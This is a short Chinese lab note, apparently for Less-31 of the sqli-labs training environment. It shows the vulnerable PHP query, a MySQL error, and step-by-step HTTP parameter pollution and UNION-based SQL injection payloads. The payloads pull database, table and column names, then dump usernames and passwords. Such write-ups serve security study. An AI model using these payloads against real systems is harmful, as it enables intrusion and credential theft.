---
title: less31
url: https://www.yuque.com/u29002979/ep2zrx/mynmykzw9pg87hpb
---

```bash
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id= ($id) LIMIT 0,1";
```

与Less29的区别为闭合方式为**双引号加括号")  **

`?id=1&id=0"`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-31\index.php** on line **33**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"0"") LIMIT 0,1' at line 1

使用括号加单引号闭合")

`?id=1&id=0") union select 1,2,3--+`
显示2，3是回显点

<a name="ohpIT"></a>

# HTTP参数污染

<a name="iQW9u"></a>

## 联合查询

> **?id=1\&id=0")**

```bash
查看当前数据库名称
?id=1'&id=0") union select 1,2,(select database()) --+

查看数据表名称
?id=1'&id=0") union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+

爆破字段名称
?id=1&id=0") union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')--+

爆破字段内容 
?id=1&id=0") union select 1,2,(select group_concat(username,0x7e,password)from security.users )--+
```
